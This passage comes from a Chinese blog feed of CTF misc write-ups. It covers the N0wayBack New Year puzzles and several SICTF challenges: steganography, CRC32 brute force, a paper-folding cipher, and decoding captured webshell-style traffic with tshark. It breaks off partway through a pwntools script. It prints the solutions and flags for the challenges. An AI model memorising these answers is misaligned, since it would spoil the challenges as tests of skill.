        <content type="html"><![CDATA[<table><thead><tr><th>状态简写</th><th>状态</th><th>状态说明</th></tr></thead><tbody><tr><td>W</td><td>Wait</td><td>没有人做这道题，你可以开始尝试</td></tr><tr><td>S</td><td>Stuck</td><td>题目做到一半思路卡壳</td></tr><tr><td>F</td><td>Finished</td><td>完成该题</td></tr><tr><td>1</td><td>First Blood</td><td>获得一血</td></tr><tr><td>2</td><td>Second Blood</td><td>获得二血</td></tr><tr><td>3</td><td>Third Blood</td><td>获得三血</td></tr><tr><td>L</td><td>Lack WP</td><td>完成并缺少WP</td></tr></tbody></table><h1 id="N0wayBack-春节红包题"><a href="#N0wayBack-春节红包题" class="headerlink" title="N0wayBack 春节红包题"></a>N0wayBack 春节红包题</h1><h2 id="1-F3-春节红包题-Misc1-easypic"><a href="#1-F3-春节红包题-Misc1-easypic" class="headerlink" title="1. F3 | 春节红包题-Misc1-easypic |"></a>1. F3 | 春节红包题-Misc1-easypic |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hint:ENDEND，从10到70。此为最后一步的hint，请务必注意flag的格式。</span><br><span class="line"></span><br><span class="line">不好意思，旧附件有点问题， 如果你crc32出来的是_folk_，请改成_folk，去掉最后一个_，新附件不需要去掉_，因附件问题，此题红包金额改为150。</span><br><span class="line"></span><br><span class="line">其中CF.zip为旧附件，easypic_new.zip为新附件；新旧附件flag不一样，提交任意一个均为正确。</span><br><span class="line"></span><br><span class="line">春节红包题，供大家娱乐，做出该题的同学请带着WP联系群主qq(xxxx)，红包题共100元，所有做出来的同学平分。flag格式为N0wayBack&#123;XXXXXXXXX&#125;</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li>解压<code>CF.zip</code>得到<code>folktales.jpg</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205045261.png" alt="image-20230118205045261"></p><ol start="2"><li>尾部一眼zip，<code>0000</code>改为<code>504B0304</code>，得到<code>1.zip</code>，里面的文件是一个data和4个文本文件</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205117490-16740462781821.png" alt="image-20230118205117490"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205157512.png" alt="image-20230118205157512"></p><ol start="3"><li>文本文件明显可以crc32爆破，因为<code>1~6</code>字节</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205250760.png" alt="image-20230118205250760"></p><ol start="4"><li>导出csv后，一个一个找，就发现了有意义的字符</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205309350.png" alt="image-20230118205309350"></p><ol start="5"><li><code>兔.txt: inese</code>，<code>狐.txt: tales_</code>，<code>豕.txt: _folk_</code>，<code>鹅.txt: YAO_Ch</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205507066.png" alt="image-20230118205507066"></p><p>根据狐兔豕鹅的顺序拼接一下，就是<code>YAO_Chinese_folk_tales_</code></p><ol start="6"><li>使用上面解压zip没成功，后面才知道是题目弄错了，要删掉一个<code>_folk_</code>最后面的<code>_</code>，也就是<code>YAO_Chinese_folktales_</code>，成功解压了出来，使用<code>010editor</code>打开data</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205841043.png" alt="image-20230118205841043"></p><p>很明显16进制，使用<code>cyberchef</code>，这个一眼png的尾部，不过逆序了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118205926229.png" alt="image-20230118205926229"></p><p>逆序我这边是批量脚本，我就懒得贴出来了</p><ol start="7"><li>最后找了很久才找到了flag，png的最后一层IDAT是有问题的，<code>010editor</code>打开就会提示，最后一层crc32有问题，其实这个问题是因为最后一层有字节被修改了</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118210122451.png" alt="image-20230118210122451"></p><p>关于hint的提示<code>ENDEND，从10到70。</code>，其实是说最后面最后面，10h~70h，仔细看他们的行前面的序号</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118210305295.png" alt="image-20230118210305295"></p><p><strong>N0wayBack{F0x_r4Pig_goOs3~~}</strong></p><br><h2 id="2-F3-春节红包题-Misc2-Old"><a href="#2-F3-春节红包题-Misc2-Old" class="headerlink" title="2. F3 | 春节红包题-Misc2-Old |"></a>2. F3 | 春节红包题-Misc2-Old |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">春节红包题，供大家娱乐，做出该题的同学请带着WP联系群主qq(xxxx)，红包题共100元，所有做出来的同学平分。flag格式为N0wayBack&#123;XXXXXXXXX&#125;</span><br><span class="line"></span><br><span class="line">hint:</span><br><span class="line"></span><br><span class="line">1.解出的结果包上N0wayBack提交。</span><br><span class="line"></span><br><span class="line">2.游戏一般玩法，两手向上下提为第一步，左右拉为第二步。</span><br><span class="line"></span><br><span class="line">3.压缩包中为hint而已，别太纠结，原始png图片即可得到flag</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li>首先折纸，完成如图的样子</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118185022930.png" alt="image-20230118185022930"></p><ol start="2"><li>制作好了东南西北，摆放位置如下图</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118185137778.png" alt="image-20230118185137778"></p><ol start="3"><li>然后就是玩游戏</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">E5S1S8E4S4S5N5W5E2S3W3N4W4S1S2S4E6E8N4N7N6S7N7S1E3S2N6W7E3N4W7S5在png的尾部</span><br><span class="line">E5S1S8E4S4S5N5W5E2S3W3N4W4S1S2S4E6E8N4N7N6S7N7S1E3S2N6W7E3N4W7S5</span><br><span class="line"></span><br><span class="line">东 east 南 south 西 west 北 north</span><br><span class="line"></span><br><span class="line">东5 南1 南8 东4 南4</span><br><span class="line">南5 北5 西5 东2 南3</span><br><span class="line">西3 北4 西4 南1 南2</span><br><span class="line">南4 东6 东8 北4 北7</span><br><span class="line">北6 南7 北7 南1 东3</span><br><span class="line">南2 北6 西7 东3 北4</span><br><span class="line">西7 南5</span><br><span class="line"></span><br><span class="line">C B A D A</span><br><span class="line">B F G D B</span><br><span class="line">G E H B A</span><br><span class="line">A D D E F</span><br><span class="line">E B F B C</span><br><span class="line">A E G C E</span><br><span class="line">G B</span><br><span class="line"></span><br><span class="line"># 最终得到</span><br><span class="line">CBADABFGDBGEHBAADDEFEBFBCAEGCEGB</span><br></pre></td></tr></table></figure><ol start="4"><li>如果你仔细看图，会发现C的下面有个010，A的下面有个000</li></ol><p>我第一步是把A替换为000，C替换为010，然后其他的全部转binary，然后再去转ascii，没有成功</p><p>正确做法是：A –&gt; 000, C –&gt; 010, 所以B大胆点就是 001，所以对应关系就是<code>ABCDEFGH</code>对应<code>01234567</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A 000</span></span><br><span class="line"><span class="string">C 010</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">根据A --&gt; 000, C --&gt; 010</span></span><br><span class="line"><span class="string">所以B --&gt; 001</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">所以映射关系就是 ABCDEFGH 01234567</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;CBADABFGDBGEHBAADDEFEBFBCAEGCEGB&quot;</span></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(<span class="string">&quot;ABCDEFGH&quot;</span>, <span class="string">&quot;01234567&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_str= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher_text.translate(table):</span><br><span class="line">    bin_str += <span class="built_in">bin</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># binary to ascii</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118185431755.png" alt="image-20230118185431755"></p><p><strong>N0wayBack{D0ngN@nXiBe1}</strong></p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>关于这个东南西北，如果很快的就得到结果，我这边写了个脚本，由于这道题目并不多，所以可以自己一个一个试出来（如果遇到BT出题人，就不可能一个一个试了，你需要考虑写个脚本了，这边只做扩展讨论可看可不看）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 东 east 南 south 西 west 北 north</span></span><br><span class="line"></span><br><span class="line">dic = &#123;</span><br><span class="line"><span class="string">&quot;E&quot;</span>: [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>],</span><br><span class="line"><span class="string">&quot;S&quot;</span>: [<span class="string">&quot;B&quot;</span>, <span class="string">&quot;A&quot;</span>],</span><br><span class="line"><span class="string">&quot;W&quot;</span>: [<span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>],</span><br><span class="line"><span class="string">&quot;N&quot;</span>: [<span class="string">&quot;F&quot;</span>, <span class="string">&quot;E&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;E5S1S8E4S4S5N5W5E2S3W3N4W4S1S2S4E6E8N4N7N6S7N7S1E3S2N6W7E3N4W7S5&quot;</span></span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), <span class="number">2</span>):</span><br><span class="line">part = cipher_text[i:i+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(part[-<span class="number">1</span>]) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">plain_text += dic[part[<span class="number">0</span>]][<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">plain_text += dic[part[<span class="number">0</span>]][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118212038416.png" alt="image-20230118212038416"></p><p><strong>原理：</strong></p><p>因为东南西北，就4个面，每个面也就是2种情况，一共就是8个情况</p><p>举个例子，比如说东1，东1&#x3D;C，东3你会发现也还是C，东2&#x3D;D，东4也会等于D，以此类推都满足，所以就可以根据这个特点写脚本</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SICTF-MISC-WriteUp</title>
      <link href="/posts/20176.html"/>
      <url>/posts/20176.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>状态简写</th><th>状态</th><th>状态说明</th></tr></thead><tbody><tr><td>W</td><td>Wait</td><td>没有人做这道题，你可以开始尝试</td></tr><tr><td>S</td><td>Stuck</td><td>题目做到一半思路卡壳</td></tr><tr><td>F</td><td>Finished</td><td>完成该题</td></tr><tr><td>1</td><td>First Blood</td><td>获得一血</td></tr><tr><td>2</td><td>Second Blood</td><td>获得二血</td></tr><tr><td>3</td><td>Third Blood</td><td>获得三血</td></tr><tr><td>L</td><td>Lack WP</td><td>完成并缺少WP</td></tr></tbody></table><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-F-color"><a href="#1-F-color" class="headerlink" title="1. F | color |"></a>1. F | color |</h2><p><strong>题目说明：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些毫无规律的颜色中隐藏着怎样的小世界呢？</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p>我不知道啥时候比赛，别人来问我题目我才知道的，然后就上线了，不然这题估计我一血应该没哈问题。</p><ol><li>下载好了题目，就是一张png的题目，这个像素这么多，而且无规律的颜色中，很显然就是颜色频率了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117193846683.png" alt="image-20230117193846683"></p><ol start="2"><li>其他颜色平均都在700~800左右，直接把序号写上去，提取一下就出来图片，然后扫描二维码就好了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117211745114.png" alt="image-20230117211745114"></p><p>工具链接：<a href="https://github.com/Byxs20/FrequencyColor">Byxs20&#x2F;FrequencyColor</a>，工具也是我开发，哈哈哈~</p><ol start="3"><li>扫描二维码，拿到flag</li></ol><p><strong>SICTF{448e8531-c752-4847-ae7e-0e702a8fb915}</strong></p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>我这题是非预期（也不算非预期，都是一个原理，但是我不是按照出题人的思路解的，这是出题人的思路）</p><p>但是出题人的意图是让我们把<code>sava.png</code>图片尾部的zip提取出来，再加上PK文件头，然后解伪加密，得到<code>encode.py</code>，再根据<code>encode.py</code>写<code>decode.py</code></p><p><strong>encode.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">flag = flag.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">new = Image.new(<span class="string">&quot;RGB&quot;</span>,flag.size)</span><br><span class="line">h=flag.height</span><br><span class="line">w=flag.width</span><br><span class="line">num=[<span class="number">0</span>,<span class="number">128</span>,<span class="number">255</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        r,g,b = flag.getpixel((i,k))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">0</span> <span class="keyword">and</span> g == <span class="number">0</span> <span class="keyword">and</span> b ==<span class="number">0</span>:</span><br><span class="line">            new.putpixel((i,k),((random.choice(num),random.choice(num),random.choice(num))))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new.putpixel((i,k),(random.randint(<span class="number">0</span>,<span class="number">255</span>),random.randint(<span class="number">0</span>,<span class="number">255</span>),random.randint(<span class="number">0</span>,<span class="number">255</span>)))</span><br><span class="line">new.save(<span class="string">&#x27;save.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>decode.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = [<span class="number">0</span>, <span class="number">128</span>, <span class="number">255</span>]</span><br><span class="line">lis = <span class="built_in">list</span>(itertools.product(num, repeat=<span class="number">3</span>))</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;./save.png&quot;</span>)</span><br><span class="line">new_img = Image.new(<span class="string">&quot;L&quot;</span>, size=(img.width, img.height), color=<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        <span class="keyword">if</span> img.getpixel((x, y)) <span class="keyword">in</span> lis:</span><br><span class="line">            new_img.putpixel((x, y), value=<span class="number">0</span>)</span><br><span class="line">new_img.show()</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117211704824.png" alt="image-20230117211704824"></p><br><h2 id="2-F-签到打卡完成"><a href="#2-F-签到打卡完成" class="headerlink" title="2. F | 签到打卡完成 |"></a>2. F | 签到打卡完成 |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">听说,这个签到题扫码关注公众号回复一个特定的“Key”就可以拿到Flag，出题人把Key也藏在题目中了。</span><br><span class="line"></span><br><span class="line">聪明的人只需要两步，你需要几步？</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li>下载好题目就是一个图片</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194351525.png" alt="image-20230117194351525"></p><ol start="2"><li>由于之前做过该平台的题目，所以知道是那个公众号，这张图片，你把亮度和对比图如图调整一下，微信运气好可以扫描出来，实在不行用CQR。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194429716.png" alt="image-20230117194429716"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194436660.png" alt="image-20230117194436660"></p><p><a href="http://weixin.qq.com/r/dS-v9yPE436crWeU93pn">http://weixin.qq.com/r/dS-v9yPE436crWeU93pn</a></p><ol start="3"><li>key用<code>010editor</code>打开图片就发现了</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194501105.png" alt="image-20230117194501105"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194509408.png" alt="image-20230117194509408"></p><p><strong>SICTF{fb23cefd-487f-42dd-a343-2a06194efc60}</strong></p><br><h2 id="3-F-Hacker"><a href="#3-F-Hacker" class="headerlink" title="3. F | Hacker |"></a>3. F | Hacker |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">树木是个大黑客，经过调查，在一次玩靶场的过程中，喜欢兔子的他把flag藏在了根目录的tmp目录下，我们截取了他回头查看flag时的流量，你能找到他藏起来的flag并进行解密吗？</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li>打开后看见了很多base64，但是一个一个复制不方便，所以我就直接用<code>tshark</code>提取。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r .\hacker.pcapng -Y &#x27;http &amp;&amp; data-text-lines&#x27; -T fields -e text &gt; out.txt</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194930888.png" alt="image-20230117194930888"></p><p>稍微处理一下，删掉不需要的。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117194950291.png" alt="image-20230117194950291"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f7f89f88MS5waHAKZHZ3YV9lbWFpbC5wbmcKZTI2NGM1NWJlCi92YXIvd3d3L2h0bWwvaGFja2FibGUvdXBsb2FkcwphN2ViM2RmODc0ZQo=bbe13</span><br><span class="line"></span><br><span class="line">bbc49d5f83e5ZTI2NGM1NWJlCi92YXIvdG1wL3Bhc3N3b3JkMXNHdWlfMXNfc2h1bXUKYTdlYjNkZjg3NGUKae13e2ed</span><br><span class="line"></span><br><span class="line">e9b74d9ZmxhZy50eHQKZTI2NGM1NWJlCi92YXIvdG1wL3Bhc3N3b3JkMXNHdWlfMXNfc2h1bXUKYTdlYjNkZjg3NGUK4c61b3e96769</span><br><span class="line"></span><br><span class="line">1a0068f71eU0lDVEZ7VGhpc19pc19hX2Zha2VfZmw0ZyEhIX1lMjY0YzU1YmUKL3Zhci90bXAvcGFzc3dvcmQxc0d1aV8xc19zaHVtdQphN2ViM2RmODc0ZQo=390863c</span><br><span class="line"></span><br><span class="line">cd220ecca413ZTI2NGM1NWJlCi91c3IKYTdlYjNkZjg3NGUK42bef5c</span><br><span class="line"></span><br><span class="line">d5477d0ccYmluCmdhbWVzCmluY2x1ZGUKbGliCmxvY2FsCnNiaW4Kc2hhcmUKc3JjCmUyNjRjNTViZQovdXNyCmE3ZWIzZGY4NzRlCg==b39643995</span><br><span class="line"></span><br><span class="line">66d71bf6ZTI2NGM1NWJlCi90bXAKYTdlYjNkZjg3NGUK6258c34d556</span><br><span class="line"></span><br><span class="line">e8aeefZmxhZy50eHQKZTI2NGM1NWJlCi90bXAKYTdlYjNkZjg3NGUK954bde</span><br><span class="line"></span><br><span class="line">423aa528aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==ab05b5</span><br></pre></td></tr></table></figure><ol start="2"><li>使用CyberChef，复制下面的base64到CyberChef，发现解开是乱码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">423aa528aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==ab05b5</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195306847.png" alt="image-20230117195306847"></p><ol start="3"><li>主要这段base64有个<code>==</code>，一般是base64结束后的补位符号，所以我们先把后面的<code>ab05b5</code>删掉，依旧乱码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">423aa528aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195344051.png" alt="image-20230117195344051"></p><p>我感觉前面的<code>423aa5</code>也不太对劲，就一个一个的删。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195423404.png" alt="image-20230117195423404"></p><p>当我删了一个4，就出现了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQByITd05Uu05ZAv0o=</span><br></pre></td></tr></table></figure><p>这个明显就是Aes&#x2F;Des&#x2F;Rabbit等之类的加密。</p><ol start="4"><li>同理处理下面的base64，这边我就直接放图片了</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1a0068f71eU0lDVEZ7VGhpc19pc19hX2Zha2VfZmw0ZyEhIX1lMjY0YzU1YmUKL3Zhci90bXAvcGFzc3dvcmQxc0d1aV8xc19zaHVtdQphN2ViM2RmODc0ZQo=390863c</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195641513.png" alt="image-20230117195641513"></p><p>我们得到了密码了：password1sGui_1s_shumu</p><ol start="5"><li>注意题目的描述，喜欢兔子的他把flag藏在了根目录的tmp目录下，刚刚好是在tmp目录下，兔子就是rabbit加密。解密的网站：<a href="http://www.esjson.com/rabbitEncrypt.html">http://www.esjson.com/rabbitEncrypt.html</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117195925907.png" alt="image-20230117195925907"></p><p><strong>SICTF{50da673c-3b59-4a6f-81da-79cba7eb63b1}</strong></p><br><h2 id="4-F1-geek-challenge"><a href="#4-F1-geek-challenge" class="headerlink" title="4. F1 | geek_challenge |"></a>4. F1 | geek_challenge |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请使用NC连接</span><br></pre></td></tr></table></figure><p>这道题目很早就出来了，但是一直没师傅做，我也不知道为嘛，那个时候没进比赛群，然后我就说我来试试，然后遇到了题目的出错的问题。导致我脚本没办法正常跑起来，然后树木重新写了个python版本的，题目上线后，脚本直接run就好了，抢了个一血。</p><p><strong>解题思路：</strong></p><ol><li>看题目，就是问你一些简单的编程问题。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117200306905.png" alt="image-20230117200306905"></p><ol start="2"><li>第一个做完了第二个又来了，一直循环。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117200414878.png" alt="image-20230117200414878"></p><ol start="3"><li>所以写个脚本就好了</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">io = 